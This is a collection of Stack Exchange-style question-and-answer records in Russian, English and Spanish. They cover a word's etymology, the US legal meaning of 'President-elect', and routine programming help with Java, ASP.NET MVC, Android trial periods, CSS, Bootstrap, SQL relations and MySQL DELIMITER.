{"title": "Шуфлядка — это русское или белорусское слово?", "description": "Недавно приехал в Беларусь и услышал слово шуфлядка, которое, по утверждению местных, считается белорусским словом. Так ли это на самом деле?\nНу и попутно, может кто-нибудь рассказать — откуда это слово появилось?\n", "answer": "шуфлядка \n\nВыдвижной ящик (стола, комода, шкафа и т.п.).\nПроисходит от немецкого слова Schublade (с тем же значением) через польские szuflada и szufladka.\nЭто слово широко распространено в Латвии, в Белоруссии (где является по сути литературным), на Украине (с Х), встречается в Средней Азии, в Молдавии, возможно – в остальной Прибалтике, и иногда – в России.\nЛюбая выдвижная полка.\nВыдвижной модуль в электрических распределительных шкафах.  \n\nЕсть такие версии возникновения этого слова:  \n\nСлово шуфлядка (укр. шухлядка или шухляда) пришло от нем. Schublade (нем. Schub — толкать) и заимствовано славянскими народами у австрийцев.\nОбразовано от польск. Szuflada или Szufladka — возможно, с появлением в конце сороковых годов переселенцев и ссыльных из Польши.  \n\nВ универсальном дополнительном практическом толковом словаре И. Мостицкого утверждается, что это белорусское слово. Присутствует слово и во многих украинских словарях (с вариациями).\nА ведь нашлось и в русском словаре синонимов В. Н. Тришина (2013):\nящик (сущ., кол-во синонимов: 61) — шуфлядка, шухлядка.  \nАнна Владимировна присела на угловой диван на кухне и достала из шуфлядки кухонного комода потрепанный кошелек.\nА. Чиж-Литаж. Дары Бога  \nОна хитро улыбнулась и достала из шуфлядки чернильную ручку.\nАнте Наудис. Придорожное солнце  \nP. S. Мне это слово раньше не встречалось (Эстония, Санкт-Петербург, Новгород), поэтому выводы делать не берусь.\n", "question_score": "6", "answer_score": 10}
{"title": "When is a person legally considered to be \"President-elect\" in regards to laws against threatening the President?", "description": "There have been news stories about individuals threatening to kill President-elect Donald Trump shortly after the election, such as this man who did it over Twitter. According to the news article, he tweeted it at 1:42am EDT on the day after Election Day. However, it wasn't until 3:00am EDT that Trump secured 270 Electoral College votes (at least according to the media, since the Electoral College does not meet until later).\nFrom a legal standpoint, when exactly is a person considered to be \"President-elect\" regarding the laws to threaten the President?\n", "answer": "The US legal code regarding threatening a president is 18 U.S. Code § 871 - Threats against President and successors to the Presidency. The first clause defines how threatening the president is illegal. The second clause starts off by defining \"President-elect\":\n\nThe terms “President-elect” and “Vice President-elect” as used in this section shall mean such persons as are the apparent successful candidates for the offices of President and Vice President, respectively, as ascertained from the results of the general elections held to determine the electors of President and Vice President in accordance with title 3, United States Code, sections 1 and 2.\n\nSo the key here is that they are the \"the apparent successful candidates […]  as ascertained from the results of the general elections.\" It doesn't define this phrase though, especially the word \"apparent\". \nIt appears that the prosecutors in the case mentioned in the question are arguing that Donald Trump became the apparent President-elect when, after Election Day, voting results began coming in and he was projected to win 270 electoral votes. Given the amount of stock that most Americans seem to put into the media's coverage of who wins the election (and the fact that the person in question seems to have assumed he would be president), that's unlikely to be contested.\n", "question_score": "9", "answer_score": 11}
{"title": "¿Cómo comparar correctamente Strings (y objetos) en Java?", "description": "Estoy creando un mini juego en el que el usuario intenta adivinar un nombre. Pero cuando quiero comparar dos cadenas de texto para ver si son iguales no parece funcionar.\nfinal String miNombre = \"Jordi\";\nScanner input = new Scanner(System.in);\nSystem.out.println(\"Adivina mi nombre: \");\n\nwhile (true) {\n    String intento = input.next();\n    if(intento == miNombre) {\n        System.out.println(\"Acertaste!\");\n        break;\n    } else {\n        System.out.println(\"Intentalo de nuevo!\");\n    }\n}\n\nSALIDA:\nAdivina mi nombre: \nmanuel\nIntentalo de nuevo!\njordi\nIntentalo de nuevo!\nJordi\nIntentalo de nuevo!\n\n", "answer": "En Java solo los tipos primitivos (Descritos en el JLS (§4.2), por ejemplo int o char) se comparan con ==, los Strings (y los demas objetos) en Java se comparan entre ellos con el metodo equals.\nString#equals(Object)\n\nCompara este String con el objeto especificado. El resultado es true si, y solo si el argumento no es null y es un objeto del tipo String que representa la misma secuencia de caracteres que este objecto.\n\nJLS (§15.21.3) Si bien puede utilizarse == para comparar referencias de tipo String, una prueba de igualdad determina si los dos operandos refieren al mismo objeto String. El resultado es false si los operandos son distintos objetos String, incluso si contienen la misma secuencia de caracteres.\n\nPor lo tanto tu comparacion debe ser:\nif(miNombre.equals(intento)) {\n\nSALIDA:\nAdivina mi nombre: \nmanuel\nIntentalo de nuevo!\nJordi\nAcertaste!\n\nACLARACIONES:\n\nHe puesto la variable miNombre al principio de la comparación para evitar una NullPointerException si intento == null  (si, las comparaciones con null tambien se hacen con ==).\nComo extra: si null es un valor válido en la representación (y por tanto queremos evitar una NPE), Objects.equals está disponible a partir de Java 7 y se encarga de devolver true si ambas son null o false si sólo lo es una. \n\nEn este caso se puede usar el metodo String#equalsIgnoreCase(Object) que ignorara MAYUSCULAS o MINUSCULAS al hacer la comparacion:\nif(miNombre.equalsIgnoreCase(intento)) {       \n\nJLS (§15.21) Los operadores de igualdad (== y !=) se pueden utilizar para comparar dos operandos que son convertibles (§5.1.8) de tipo numérico, o los dos operandos de tipo boolean o Boolean o dos operandos que > son de tipo de referencia o el tipo null. Todos los demás casos causan un error en tiempo de compilación.\n\n", "question_score": "93", "answer_score": 118}
{"title": "Enviar parámetros tipo Lista por AJAX a un controller en MVC 5", "description": "tengo esta funcion: \n$.ajax({ \n    type:\"post\", \n    url:\"/Home2/test01\", \n    data: procesoData,\n    succes: function(datos){ \n        $(\"#DatosRespuesta\").html(datos); \n    }\n);\n\ndonde procesoData corresponde a una lista de datos: \nvar procesoData = { 'items':[ ] }\n\nMi pregunta es \n¿Cómo puedo trabajar con ellos (recibir el parámetro en forma de lista) en un controller de  MVC 5 en C#? Cualquier ayuda me vendría bien, gracias.\nPregunta formulada originalmente en Google+\n", "answer": "MVC realiza el binding de acuerdo a los nombres de los parámetros y el tipo, entonces para recibir los elementos de un array según el ejemplo en tu controller Home2:\n[HttpPost]\npublic ActionResult Test01(List</* tipo de los elementos */> items) {\n    var resultado = // Los datos que quieres devolver\n\n    return Json(resultado);\n}\n\nAquí depende el tipo de elementos que hay en items, en el caso más simple si fuese un conjunto de cadenas usuarías List<string>.  \nProbablemente estés envíando objetos con más propiedades, en ese caso tendrías que crear una clase en C# que siga la estructura de los objetos de JavaScript para que MVC los deserialize en esta.  Por ejemplo si en el lado cliente tienes\nvar procesoData = { 'items': [ \n    { nombre: 'uno', edad: 1 }, \n    { nombre: 'dos', edad: 2 }, \n    { nombre: 'tres', edad: 3 }\n] };\n\nEntonces en C# podrías crear una clase\npublic class Usuario\n{\n    public string Nombre { get; set; }\n    public int Edad { get; set; }\n}\n\ny en la firma del action usar List<Usuario> items\n\nPor otro lado, si el objeto que se está envíando tiene más propiedades que solamente items ya sería recomendable crear un modelo específico para recibir todo\npublic class ProcesoData\n{\n    public int Id { get; set; }\n    public string Descripcion { get; set; }\n    public List<Usuario> Items { get; set; }\n}\n\nlos datos igualmente serían mapeados de manera automática por el nombre de las propiedades y usarías este modelo\n[HttpPost]\npublic ActionResult Test01(ProcesoData data)\n\n", "question_score": "9", "answer_score": 13}
{"title": "Aplicar Fecha de Caducidad a una aplicación (Trial version)", "description": "En algunas aplicaciones de pago, te muestra un diálogo para que puedas comprar la versión completa de la app, y en otros es la prueba de los 30 días.\n¿Cómo aplicar una fecha de caducidad a una aplicación en Android?\n", "answer": "Respuesta inspirada en SO, SO, mobile-trial\nManeras que se podría implementar, de más simple de saltarse a más complejo.\n\nPrimer método guardar la fecha de instalación en base de datos, fichero interno o externo de la app o usar shared preferences.\nPero es muy probable que el usuario se salte la restricción del tiempo de prueba:, desinstalado y instalado de nuevo la app, si se usa una ubicación externa para el archivo, puede que el usuario no se de cuenta del residuo.\nSegundo método: usar una fecha limite fija hard bomb-time es decir que para todos los usuarios a tal fecha expira. Es fácil de saltarse esa restricción, solo cambiar la hora del sistema por una fecha anterior a la fecha limite, para el usuario le puede ser un poco engorroso hacerlo a menudo y decide comprar.\nTercer método de todos lo otro es el más seguro (pero no infalible) eso si requiere de más recursos, conexión a internet, servidor web propio, es crear un comprobador remoto de identificador único, se puede obtener getDeviceId del dispositivo y comprobar a la base de datos remota si existe, obtenga la fecha de instalación, si no existe que agregue un nuevo entrada getDeviceId : fecha agregación.\nsi el dispositivo no tiene internet se puede advertir al usuario y finalizar la app.\n\nCódigo de cada método\nno comprobado si funcionan:\nEjemplo del primer método usando SharedPreference\nprivate final SimpleDateFormat formatter = new SimpleDateFormat(\"yyyy-MM-dd\");\nprivate final long ONE_DAY = 24 * 60 * 60 * 1000;\n\n@Override\nprotected void onCreate(Bundle state){\n    SharedPreferences preferences = getPreferences(MODE_PRIVATE);\n    String installDate = preferences.getString(\"InstallDate\", null);\n    if(installDate == null) {\n        // First run, so save the current date\n        SharedPreferences.Editor editor = preferences.edit();\n        Date now = new Date();\n        String dateString = formatter.format(now);\n        editor.putString(\"InstallDate\", dateString);\n        // Commit the edits!\n        editor.commit();\n    }\n    else {\n        // This is not the 1st run, check install date\n        Date before = (Date)formatter.parse(installDate);\n        Date now = new Date();\n        long diff = now.getTimeInMillis() - before.getTimeInMillis();\n        long days = diff / ONE_DAY;\n        if(days > 30) { // More than 30 days?\n             // Expired !!!\n        }\n    }\n\n    ...\n}\n\nEjemplo del segundo método usando time-bomb\nprotected void onResume()\n{   \n    super.onResume();\n\n    Calendar expirationDate = Calendar.getInstance();\n    expirationDate.set(2016, 12, 31);  //expirara final de año\n    Calendar t = Calendar.getInstance();  //obtener fecha actual\n    if (t.compareTo(expirationDate) == 1)\n       finish();\n}\n\nEjemplo del tercer método respuesta del usuario @Martin_christmman implementar https://github.com/mobile-trial \n", "question_score": "9", "answer_score": 12}
{"title": "Recorrer Objeto JSON", "description": "Tengo este json:\nvar json =    {\n     \"0\":{\n       \"check\":true,\n       \"OBJECT_ID\":{\n         \"check\":false,\n         \"name\":\"OBJECT_ID\",\n         },\n      \"nameTable\":\"TEST1\",\n      \"EVENT_NAME_MANAGE\":{\n         \"check\":false,\n         \"name\":\"EVENT_NAME_MANAGE\",\n      }}\n     \"1\":{\n      \"check\":true,\n      \"OBJECT_ID\":{\n         \"check\":false,\n         \"name\":\"OBJECT_ID\",\n      },\n      \"nameTable\":\"TEST1\",\n      \"EVENT_NAME_MANAGE\":{\n         \"check\":false,\n         \"name\":\"EVENT_NAME_MANAGE\",\n      }\n     }\n    }\n\nQuisiera que si me llega 0 o 1, cambiar el valor de ObJECT_ID y EVENT_NAME a true\nHe probado hacer este for :\n    for (var i in json) {\n        console.log(json[i].nameTable)\n    }\n\nSegun me pasen 0 o 1, tengo que recorrer lo que hay dentro de ellos(en mi ejemplo solo tengo 2 el ObJECT_ID y EVENT_NAME pero tengo muchos más) y cambair el valor de check que hay dentro de ellos por true\n", "answer": "Comprueba el siguiente programa. En él se comprueba la existencia de la propiedad check de cada elemento para asignarle true en caso afirmativo.\n\nlet json = {\r\n      \"0\":{\r\n       \"check\":true,\r\n       \"OBJECT_ID\":{\r\n         \"check\":false,\r\n         \"name\":\"OBJECT_ID\",\r\n         },\r\n      \"nameTable\":\"TEST1\",\r\n      \"EVENT_NAME_MANAGE\":{\r\n         \"check\":false,\r\n         \"name\":\"EVENT_NAME_MANAGE\",\r\n      }},\r\n     \"1\":{\r\n      \"check\":true,\r\n      \"OBJECT_ID\":{\r\n         \"check\":false,\r\n         \"name\":\"OBJECT_ID\",\r\n      },\r\n      \"nameTable\":\"TEST1\",\r\n      \"EVENT_NAME_MANAGE\":{\r\n         \"check\":false,\r\n         \"name\":\"EVENT_NAME_MANAGE\",\r\n      }\r\n     }\r\n    };\r\n \r\nfor (let i in json) {\r\n  for (let j in json[i]) {\r\n    if (json[i][j].hasOwnProperty('check')) {\r\n      json[i][j].check = true;\r\n    }\r\n  }\r\n}\r\n\r\nconsole.log(\"Mostrando resultado final:\");\r\nconsole.log(json);\n\nSegún la edición que me proporcionas, es más eficiente hacer lo siguiente:\n\nlet json = {\r\n      \"0\":{\r\n       \"check\":true,\r\n       \"OBJECT_ID\":{\r\n         \"check\":false,\r\n         \"name\":\"OBJECT_ID\",\r\n         },\r\n      \"nameTable\":\"TEST1\",\r\n      \"EVENT_NAME_MANAGE\":{\r\n         \"check\":false,\r\n         \"name\":\"EVENT_NAME_MANAGE\",\r\n      }},\r\n     \"1\":{\r\n      \"check\":true,\r\n      \"OBJECT_ID\":{\r\n         \"check\":false,\r\n         \"name\":\"OBJECT_ID\",\r\n      },\r\n      \"nameTable\":\"TEST1\",\r\n      \"EVENT_NAME_MANAGE\":{\r\n         \"check\":false,\r\n         \"name\":\"EVENT_NAME_MANAGE\",\r\n      }\r\n     }\r\n    };\r\n \r\n/* Sólo debemos cambiar los elementos 0 y 1 si existen */\r\n$scope.toggle = function(isCheck, index) {\r\n if (json.hasOwnProperty(index)) {\r\n  /* No es necesario usar index.toString() */\r\n   for (let j in json[index]) {\r\n    if (json[index][j].hasOwnProperty('check')) {\r\n      json[index][j].check = isCheck;\r\n    }\r\n   }\r\n }\r\n}\r\n\r\nconsole.log(\"Mostrando resultado final:\");\r\nconsole.log(json);\n\nSi recibes, como dices en tu pregunta, 50 o más registros es un desperdicio de tiempo recorrer todos y cada uno de los elementos si sólo buscas dos en concreto, el índice 0 y el 1.\n", "question_score": "9", "answer_score": 11}
{"title": "¿Comó agregar estilo a un checkbox?", "description": "Necesito agregarle un estilo a mi checkbox para que quede asi:\n\neste es mi codigo:\n<input type=\"checkbox\" data-role=\"flipswitch\" name=\"switch\" id=\"switch\">\n\nIntente colocar este codigo, pero usa librerias y si la agrego a mi proyecto se daña el css de la pagina:\n\n    <head>\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <link rel=\"stylesheet\" href=\"https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css\">\r\n    <script src=\"https://code.jquery.com/jquery-1.11.3.min.js\"></script>\r\n    <script src=\"https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js\"></script>\r\n    </head>\r\n    <body>\r\n    \r\n    <div data-role=\"page\">\r\n      <div data-role=\"main\" class=\"ui-content\">\r\n        <form method=\"post\" action=\"/action_page_post.php\">\r\n          <label for=\"switch\">Flip Toggle Switch:</label>\r\n            <input type=\"checkbox\" data-role=\"flipswitch\" name=\"switch\" id=\"switch\">\r\n            <br>\r\n          <input type=\"submit\" data-inline=\"true\" value=\"Submit\">\r\n        </form>\r\n      </div>\r\n    </div>\r\n    \r\n    </body>\r\n\r\n    \n\n", "answer": "Mira este ejemplo tomado de Codepen, usando sólo CSS.\nLa imagen del background la puedes obviar o cambiarla por otra de tu preferencia.\nCodepen es como una librería en línea donde se pueden encontrar interesantes fragmentos de código que nos ayudan a aprender formas de sacarle un óptimo rendimiento al uso de HTML/CSS, combinado o no con Javascript. \n\n/* body background from https://subtlepatterns.com/ */\r\nbody { background: #ffffff url(https://subtlepatterns.com/patterns/rough_diagonal.png) top left repeat; } \r\n\r\n.toggleSwitch {\r\n    /* just for presentation */  \r\n    margin:20px 200px;  \r\n}\r\n\r\n\r\nlabel {\r\n    /* setup stuff */\r\n    position: relative;\r\n    z-index:1;\r\n    display: block;\r\n    font-size: 14px;\r\n    width: 80px;\r\n    height: 40px;\r\n    font-family: \"Helvetica Neue\", Arial, Sans-Serif;\r\n    font-weight:bold;\r\n    border-radius: 20px;\r\n    background-clip: padding-box;\r\n    text-align: center;\r\n    background-color: #dadada;;\r\n    /* box-shadow: inset 0 0 6px 1px rgba(00,00,00,.2); */\r\n    \r\n    box-shadow: inset rgba(38, 38, 38, 0.2) 0 0px 0px 1px, /* border */ \r\n    inset rgba(38, 38, 38, .3) 0 -1px 3px 2px, /* soft SD */ \r\n    inset rgba(255, 255, 255, .3) 0 1px 0px 4px, /* top HL */ \r\n    rgba(0, 0, 0, .3) 0 0 3px 2px, /* outer SD */   \r\n      rgba(255, 255, 255, .5) 0 0 3px 2px;\r\n  \r\n  background-image: -webkit-repeating-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0) 6%, rgba(255, 255, 255, .1) 7.5%),   -webkit-repeating-linear-gradient(left, transparent 0%, transparent 4%, rgba(0, 0, 0, .03) 4.5%),   -webkit-repeating-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0) 1.2%, rgba(255, 255, 255, .15) 2.2%), -webkit-linear-gradient(-90deg, #C7C7C7 0%, #E6E6E6 47%, #C7C7C7 53%, #B3B3B3 100%);\r\n}\r\nlabel input {\r\n    position: absolute;\r\n    opacity: 0; \r\n}\r\nlabel span {\r\n  position:absolute;\r\n  display:block;\r\n  width:160px;\r\n  left:-180px;\r\n  top:2px;\r\n  font-size:26px;\r\n  text-align:right;\r\n  color:#444444;\r\n}\r\nlabel .knob {\r\n    position: absolute;\r\n    margin:0;\r\n    height:40px;\r\n    width:40px;\r\n    border-radius: 20px;\r\n    background-clip: padding-box;\r\n    background:#ffffff;\r\n    z-index: 5;\r\n    top:-1px;\r\n    left:-1px;\r\n    border:1px solid #cccccc;\r\n    box-shadow: 0px 1px 4px 0px rgba(00,00,00,.75);\r\n    transition: 0.18s all ease-out;\r\n}\r\n\r\nlabel:before, label:after {\r\n    position: relative;\r\n    z-index: 2;\r\n  text-shadow: rgba(102, 102, 102, .5) 0 -1px 0, rgba(255, 255, 255, .3) 0 1px 0px;\r\n}\r\nlabel:before {\r\n    content: attr(data-on);\r\n    color:#22baca;\r\n    float:left;\r\n    padding:12px 0 0 8px;\r\n}\r\nlabel:after {\r\n    content: attr(data-off);\r\n    float:right;\r\n    padding:12px 6px 0 0;\r\n}\r\nlabel input:checked + .knob {\r\n    left:41px;\r\n}\n<label data-on=\"ON\" data-off=\"OFF\" class=\"toggleSwitch\">  \r\n  <span>Ninjas</span>\r\n  <input type=\"checkbox\" checked=\"checked\"/>\r\n  <span class=\"knob\"></span>\r\n</label>\r\n\r\n<label data-on=\"ON\" data-off=\"OFF\" class=\"toggleSwitch\">  \r\n  <span>Kittens</span>\r\n  <input type=\"checkbox\"/>\r\n  <span class=\"knob\"></span>\r\n</label>\r\n\r\n<label data-on=\"ON\" data-off=\"OFF\" class=\"toggleSwitch\">  \r\n  <span>Zombies</span>\r\n  <input type=\"checkbox\"/>\r\n  <span class=\"knob\"></span>\r\n</label>\r\n\r\n<label data-on=\"ON\" data-off=\"OFF\" class=\"toggleSwitch\">  \r\n  <span>Puppies</span>\r\n  <input type=\"checkbox\" checked=\"checked\"/>\r\n  <span class=\"knob\"></span>\r\n</label>\n\n", "question_score": "9", "answer_score": 10}
{"title": "Agregar 2 inputs uno al lado del otro en la misma columna", "description": "Estoy armando un formulario en Bootstrap, y quiero que en la misma fila y la misma columna haya 2 inputs, uno al lado del otro.\nProbé con la clase input-group, con la que pude agregar botones y etiquetas a los inputs, pero cuando meto 2 inputs dentro de un input-group el segundo input pasa abajo del primero, y yo quiero que quede al lado del primero y pegado, como pasa con los input-group-addon.\n¿Cómo se podrá lograr eso? En lo posible usando las clases propias de Bootstrap.\nEsto es lo que tengo hasta ahora\n\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\">\n\n<div class=\"col-xs-12 col-md-3\">\n  <div class=\"form-group\">\n    <label for=\"\">Nro. remito</label>\n    <div class=\"input-group\">\n      <input name=\"remitosucursal\" id=\"remitosucursal\" type=\"text\" required class=\"form-control\">\n      <input name=\"remitonumero\" id=\"remitonumero\" type=\"text\" required class=\"form-control\">\n    </div>\n  </div>\n</div>\n\n", "answer": "Una opción sería añadir un input-group-addon entre los campos y dejar que Bootstrap se encargue de los estilos.\n\n<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.1.0/jquery.min.js\"></script>\r\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js\"></script>\r\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\">\r\n\r\n<div class=\"container\">\r\n  <div class=\"row\">\r\n    <div class=\"col-xs-12 col-md-3\">\r\n      <div class=\"form-group\">\r\n        <label for=\"\">Nro. remito</label>\r\n        <div class=\"input-group\">\r\n          <input name=\"remitosucursal\" id=\"remitosucursal\" type=\"text\" required class=\"form-control\" placeholder=\"Sucursal\">\r\n          <span class=\"input-group-addon\">-</span>\r\n          <input name=\"remitonumero\" id=\"remitonumero\" type=\"text\" required class=\"form-control\" placeholder=\"Numero\">\r\n        </div>\r\n      </div>\r\n    </div>\r\n  </div>\r\n</div>\n\nOtra opción si no quieres añadir input-group-addon, sería crear estilos propios (aunque no sé si eso es lo que quieres por lo que dices en la pregunta). Aquí dejo un ejemplo:\n\n.two-fields {\r\n  width:100%;\r\n}\r\n.two-fields .input-group {\r\n  width:100%;\r\n}\r\n.two-fields input {\r\n  width:50% !important;\r\n}\n<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.1.0/jquery.min.js\"></script>\r\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js\"></script>\r\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\">\r\n\r\n<div class=\"container\">\r\n  <div class=\"row\">\r\n    <div class=\"col-xs-12 col-md-3\">\r\n      <div class=\"form-group two-fields\">\r\n        <label for=\"\">Nro. remito</label>\r\n        <div class=\"input-group\">\r\n          <input name=\"remitosucursal\" id=\"remitosucursal\" type=\"text\" required class=\"form-control\" placeholder=\"Sucursal\">\r\n          <input name=\"remitonumero\" id=\"remitonumero\" type=\"text\" required class=\"form-control\" placeholder=\"Numero\">\r\n        </div>\r\n      </div>\r\n    </div>\r\n  </div>\r\n</div>\n\n", "question_score": "9", "answer_score": 10}
{"title": "Relación uno a muchos diferencia con relacion muchos a muchos", "description": "Tengo un ejemplo donde no termino de entender ¿Cuál es la forma óptima de resolverlo?\nUna tabla llamada usuarios.\nUna tabla llamada publicaciones.\nSi planeo guardar los registros de una publicación con el id del usuario que lo registro; la siguiente estructura es correcta?\n\nPero por ejemplo atendiendo a que se pudiera crear una tabla intermedia llamada publicaciones-usuarios con una estructura similar a la siguiente:\n\n¿Cuál es el modo óptimo?, ya que por ejemplo si hago la primer estructura con un inner join como el siguiente:\nSELECT titulo, cuerpo, username FROM publicaciones\nINNER JOIN usuarios\nON usuarios.id = publicaciones.usuarios_id\nWHERE usuarios.id = 2;\n\nPuedo sacar las publicaciones que haga un usuario teniendo en cuanta que la vinculación de ambas tablas es el id del usuario como llave foránea en la tabla publicaciones; pero no termino de entender bajo que escenarios se usa cada uno\nEs solo un ejemplo atendiendo a que busco aclarar esta duda\n", "answer": "Las relaciones en sí\nLa cuestión de fondo para responder a tu pregunta no es si usando este tipo de relación puedo obtener tales datos, mientras que usando este otro tipo de relación no los puedo obtener. \nRealmente, los datos los puedes obtener igualmente con cualquier tipo de relación, si las mismas están bien planteadas.\nEn breve podemos decir que: \nLa relación uno a muchos\nAplica únicamente cuando :\n\nuna publicación no puede tener más de un usuario .... (uno a...)\nun usuario puede tener varias publicaciones  ...............     (muchos)\n\nO, al revés: \n\nun usuario no puede tener más de una publicación .... (uno a...)\nuna publicación puede tener varios usuarios  ...............     (muchos)\n\nLa relación muchos a muchos\nAplica cuando: \n\nuna publicación puede tener más de un usuario ........ (muchos a...)\nun usuario puede tener varias publicaciones  ...............     (muchos)\n\nDependiendo de cómo esté montada tu aplicación, basada en la realidad de los datos que maneja, entonces tendrás que decidir por cual tipo de relación implementar.\nO sea ¿cuál es la realidad de los datos que va a manejar tu aplicación?:\n\n¿un usario, varias publicaciones?  : relación uno (usuarios) a muchos (publicaciones)\n¿una publicación, varios usuarios? : relación uno (publicaciones) a muchos (usuarios) \n¿varios usuarios, varias publicaciones? : relación muchos (usuarios) a muchos (publicaciones) implementando una tabla asociativa o de unión (usuarios_publicaciones)\n\nEl modo óptimo\nEn cuanto a la manera óptima de hacer las cosas, como ha dicho @gbianchi en su comentario. El modo óptimo es aquel que optimice lo que quieres hacer en la base de datos, cumpliendo las reglas de negocios.\nNo basta con tener un tipo de relación acorde con la realidad de los datos que manejas. Todavía quedarán cabos sueltos que debes atar en la definición de las tablas, tales como índices para agilizar la obtención de datos, controlar registros duplicados, agregar restricciones de integridad referencial que eviten la existencia de registros huérfanos, etc.\n\nObtener los datos\nSea cual sea la relación que uses, siempre podrás obtener los datos que quieras de las tablas.\nVeamos:\nObteniendo datos en una relación uno a muchos\nSELECT \n    u.nombre, \n    p.titulo \nFROM usuarios u\nINNER JOIN publicaciones p ON u.id_usario = p.id_usuario\n\nObteniendo datos en una relación muchos a muchos\nSELECT \n    u.nombre, \n    p.titulo \nFROM usuarios_publicaciones up\nINNER JOIN usuarios u ON up.id_usario = u.id_usuario\nINNER JOIN publicaciones p ON up.id_publicacion = p.id_publicacion\n\nEn ambos ejemplos se obtienen las mismas columnas. Lo única que varía es la forma de obtener los datos haciendo los JOIN correspondientes, basados en la forma en que hemos creado las relaciones.\nLo que quiero decir es que no puedes definir una relación pensando que eso tiene alguna implicación en la forma de obtener los datos. No tiene ninguna implicación. En ambos ejemplos obtenemos las mismas columnas nombre de la tabla usuarios y titulo de la tabla publicaciones. Y así, podemos obtener cualquier columna que participe de la relación.\nOtra cosa sería el hecho de obtener los datos agrupados, por ejemplo en el caso de las relaciones muchos a muchos. Para eso también existen funciones de agrupación, como GROUP_CONCAT, en el caso concreto de MySQL.\n", "question_score": "9", "answer_score": 12}
{"title": "Impedir que web se refresque al deslizar pantalla en navegador móvil", "description": "Quisiera saber si existe alguna posibilidad de evitar, que cuando esté navegando en mi aplicación móvil, el navegador recargue la página al deslizar la pantalla hacia abajo, en caso de Chrome para Android.\nCuando deslizo el dedo muy fuerte en Chrome móvil se recarga la página.\nMe gustaria saber si se puede hacer alguna configuración durante la programación de la página para evitar que esto ocurra.\n", "answer": "Agrega en tu CSS la siguiente propiedad a tu body\nbody {\n  overscroll-behavior: contain;\n}\n\nTraducción de MDN:\nLa propiedad CSS overscroll-behavior establece lo que hace un navegador cuando alcanza el límite de un área de desplazamiento. Es una taquigrafía para overscroll-behavior-x y overscroll-behavior-y.\nLa propiedad toma tres valores posibles:\n\nauto : predeterminado. El scroll que se origina en el elemento puede propagarse a elementos hijos.\ncontain - evita el encadenamiento de desplazamiento (scroll chaining). El comportamiento predeterminado de desbordamiento de desplazamiento se observa dentro del elemento en el que se establece este valor (por ejemplo, efectos de \"rebote\" o actualizaciones), pero no se produce un encadenamiento de desplazamiento a las áreas de desplazamiento vecinas, por ejemplo, los elementos subyacentes no se desplazarán.\nnone , igual que contain, pero no se produce el encadenamiento de desplazamiento a las áreas de desplazamiento vecinas, y se evita el comportamiento predeterminado de desbordamiento de desplazamiento.\n\n/* Valores de atributo clave */\noverscroll-behavior: auto; \noverscroll-behavior: contain;\noverscroll-behavior: none;\n\n/* Dos valores (X y Y respectivamente) */\noverscroll-behavior: auto contain;\n\n/* Valores Globales */\noverflow: inherit;\noverflow: initial;\noverflow: unset;\n\nDe forma predeterminada, los navegadores móviles tienden a proporcionar un efecto de \"rebote\" o incluso una actualización de la página cuando se alcanza la parte superior o inferior de una página (u otra área de desplazamiento). También puede haber notado que cuando tiene un cuadro de diálogo con contenido de desplazamiento en la parte superior de una página de contenido de desplazamiento, una vez que se alcanza el límite de desplazamiento del cuadro de diálogo, la página subyacente comenzará a desplazarse, lo que se denomina encadenamiento de desplazamiento.\n\nLa acción nativa de actualización de Chrome de Android \nactualiza toda la página\nEn algunos casos estos comportamientos no son deseables. Se puede usar overscroll-behavior para deshacerse del encadenamiento de desplazamiento no deseado y el comportamiento del tipo \"tirar para actualizar\" inspirado en la aplicación de Facebook / Twitter del navegador.\n\noverscroll-behaviour también admite shorthands (propiedades\n  abreviadas) para overscroll-behaviour-x y overscroll-behaviour-y\n  si solo desea definir comportamientos para un determinado eje.\n\nImportante: overscroll-behavior requiere Chrome 63+. Está en desarrollo o está siendo considerado por otros navegadores. Ver chromestatus.com para más información.\nFuentes:\nhttps://developers.google.com/web/updates/2017/11/overscroll-behavior\nhttps://developer.mozilla.org/en-US/docs/Web/CSS/overscroll-behavior\n", "question_score": "9", "answer_score": 14}
{"title": "Es necesario escribir DELIMITER para crear un trigger o para crear un procedimiento almacenado?", "description": "Hago esta pregunta porque yo ejecuté un trigger sin el DELIMITER y funcionó (en MySQL)\n", "answer": "\nEl objetivo del comando DELIMITER es mantener abierta la creación de las sentencias que han de componer a los procedimientos para evitar se terminen antes de tiempo, ¿pero por qué?\n\nPROCEDIMIENTOS ALMACENADOS\nCuando escribimos una sentencia regular en MySQL, tenemos algo como esto:\nSELECT * FROM tabla;\n\nDonde claramente notamos que el símbolo que indica el término de la misma es el ;\nAhora en el caso de la creación de un PA, tenemos esto:\nDELIMITER //\nCREATE PROCEDURE extraeUsuario(IN idUser INT)\n    BEGIN\n        SELECT * FROM users WHERE id = idUser;\n    END;\n//\n\nEn la sintaxis anterior, tenemos que el uso del ; como indicador de término de una sentencia se sustituye por // de modo que cuando estamos escribiendo esto desde la consola, al dar ENTER no se termine la creación del mismo en la línea del SELECT.\nHecho lo anterior, podemos indicar que toda la sentencia del PA inicia donde aparecen por primera vez // y termina hasta que este mismo símbolo vuelva a existir.\nTRIGGERS\nCaso Uno\nCuando escribimos un Trigger, tenemos una sentencia similar a esta:\nDELIMITER //\nCREATE TRIGGER multiplicaId BEFORE INSERT ON users\nFOR EACH ROW\nBEGIN\n    SET New.id = (SELECT MAX(id) * 10 FROM users);\nEND;\n//\n\nDonde del mismo modo ocupamos el DELIMITER para indicar el inicio y término de un bloque de código, nuevamente para evitar que la ejecución de este TRIGGER se efectúe en cuanto lea el ; de la línea del SET.\nPrincipalmente a nivel de la consola del gestor de bases de datos el 